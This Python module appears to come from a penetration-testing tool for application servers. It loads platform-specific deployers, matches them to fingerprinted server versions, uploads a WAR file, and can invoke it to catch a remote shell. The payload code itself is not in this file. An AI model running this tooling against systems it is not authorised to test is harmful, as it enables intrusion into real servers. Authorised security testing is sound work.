from src.module.invoke_payload import invoke
from log import LOG
import state
import utility
import importlib
import pkgutil


def run(fingerengine):
    """ This core module is used to load a specific platform's deployers
    and iterate through fingerprints to find one to deploy to.  If the --invoke
    flag was passed, then we automatically run invoke_war, which will call the
    deployed WAR and attempt to catch the shell back.
    """

    # before we do anything, ensure the deploying file exists...
    try:
        with open(fingerengine.options.deploy): pass
    except:
        utility.Msg("File '%s' could not be found." % fingerengine.options.deploy,
                                                      LOG.ERROR)
        return


    utility.Msg("Loading deployers for platform %s" % fingerengine.service, LOG.DEBUG)

    load = importlib.import_module('src.platform.%s.deployers' % fingerengine.service)

    # load all deployers
    modules = list(pkgutil.iter_modules(load.__path__))
    loaded_deployers = []

    for deployer in modules:

        dp = deployer[0].find_module(deployer[1]).load_module(deployer[1])
        if 'deploy' not in dir(dp):
            continue

        loaded_deployers.append(dp)

    # start iterating through fingerprints
    for fingerprint in fingerengine.fingerprints:

        # build list of deployers applicable to this version
        appd = [x for x in loaded_deployers if fingerprint.version in x.versions]
        for deployer in appd:

            if fingerprint.title == deployer.title:
                if fingerengine.options.deployer:

                    # they want to use a specific deployer
                    if not fingerengine.options.deployer in deployer.__name__:
                        continue

                # if the deployer is using waitServe, ensure the user knows
                if 'waitServe' in dir(deployer):
                    r = utility.capture_input("This deployer (%s) requires an external"\
                                   " listening port (%s).  Continue? [Y/n]" % (
                                      deployer.__name__, state.external_port))
                    if 'n' in r.lower():
                        continue

                utility.Msg("Deploying WAR with deployer %s (%s)" %
                                (deployer.title, deployer.__name__), LOG.DEBUG)
                deployer.deploy(fingerengine, fingerprint)

                if fingerengine.options.invoke_payload:
                    invoke(fingerengine, fingerprint, deployer)

                return

    utility.Msg("No valid fingerprints were found to deploy.", LOG.ERROR)
